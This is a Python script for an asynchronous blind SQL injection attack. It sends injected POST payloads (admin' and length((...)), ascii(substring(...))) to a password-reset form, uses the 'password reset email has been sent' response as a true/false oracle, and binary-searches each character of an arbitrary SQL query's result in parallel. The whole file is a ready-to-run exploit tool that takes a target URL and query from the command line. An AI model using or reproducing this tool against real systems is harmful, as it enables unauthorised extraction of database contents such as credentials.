import sys
import asyncio
import aiohttp
from time import time
from typing import Optional
from dataclasses import dataclass
from contextlib import asynccontextmanager

# Tweak the config as u need from here..
@dataclass
class ExtractionConfig:
    url: str
    query: str
    headers: dict
    target_text: str
    max_retries: int = 3
    max_concurrent: int = 10 
    timeout: int = 10

class AsyncSQLInjector:
    def __init__(self, config: ExtractionConfig):
        self.config = config
        self.session: Optional[aiohttp.ClientSession] = None
        self.semaphore = asyncio.Semaphore(config.max_concurrent)
        
    @asynccontextmanager
    async def get_session(self):
        if self.session is None:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            )
        try:
            yield self.session
        finally:
            pass  # hmmm, might closing the session in cleanup? maybe..

    async def cleanup(self):
        if self.session:
            await self.session.close()
            self.session = None

    async def make_request(self, payload: str) -> bool:
        """Execute a single request with retry logic"""
        async with self.semaphore:  # here, we control the concurrent connections
            for attempt in range(self.config.max_retries):
                try:
                    async with self.get_session() as session:
                        async with session.post(
                            self.config.url,
                            data=payload,
                            headers=self.config.headers
                        ) as response:
                            text = await response.text()
                            return self.config.target_text in text
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    if attempt == self.config.max_retries - 1:
                        print(f"[!] Request failed after {self.config.max_retries} attempts: {e}")
                        return False
                    await asyncio.sleep(1 * (attempt + 1))
            return False

    async def binary_search_length(self) -> int:
        left, right = 1, 100
        while left <= right:
            mid = (left + right) // 2
            payload = f"username=admin' and length(({self.config.query}))>{mid} and 1='1&reset_password=xxx"
            
            if await self.make_request(payload):
                left = mid + 1
            else:
                right = mid - 1
        
        return left

    async def binary_search_char(self, position: int) -> str:
        left, right = 32, 126  # ASCII printable range
        while left <= right:
            mid = (left + right) // 2
            payload = f"username=admin' and ascii(substring(({self.config.query}), {position}, 1))>{mid} and 1='1&reset_password=xxx"
            
            if await self.make_request(payload):
                left = mid + 1
            else:
                right = mid - 1
        
        return chr(left)

    async def extract_chars_parallel(self, positions: list[int]) -> dict[int, str]:
        tasks = [self.binary_search_char(pos) for pos in positions]
        results = await asyncio.gather(*tasks)
        return dict(zip(positions, results))

    async def extract_data(self):
        try:
            start_time = time()
            
            print("[*] Determining query length...")
            query_length = await self.binary_search_length()
            print(f"[+] Query length: {query_length}")
            
            if query_length == 0:
                print("[!] Failed to determine query length")
                return
            
            # A mechanism to Extract data in parallel chunks
            result = ""
            chunk_size = self.config.max_concurrent
            
            for chunk_start in range(1, query_length + 1, chunk_size):
                chunk_end = min(chunk_start + chunk_size, query_length + 1)
                positions = list(range(chunk_start, chunk_end))
                
                print(f"\n[*] Extracting characters {chunk_start}-{chunk_end-1}...")
                char_results = await self.extract_chars_parallel(positions)
                
                # once, we get the result, let's append them in the correct order.
                for pos in sorted(char_results.keys()):
                    result += char_results[pos]
                    print(f"[+] Progress ({pos}/{query_length}): {result}")
            
            duration = time() - start_time
            print(f"\n[*] Extraction completed in {duration:.2f} seconds")
            print(f"[*] Final result: {result}")
            
        finally:
            await self.cleanup()
            
async def main(url: str, query: str):
    config = ExtractionConfig(
        url=url,
        query=query,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        target_text="A password reset email has been sent."
    )
    
    injector = AsyncSQLInjector(config)
    await injector.extract_data()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"[!] Usage: python3 {sys.argv[0]} <url> <query>")
        sys.exit(1)

    asyncio.run(main(sys.argv[1], sys.argv[2]))
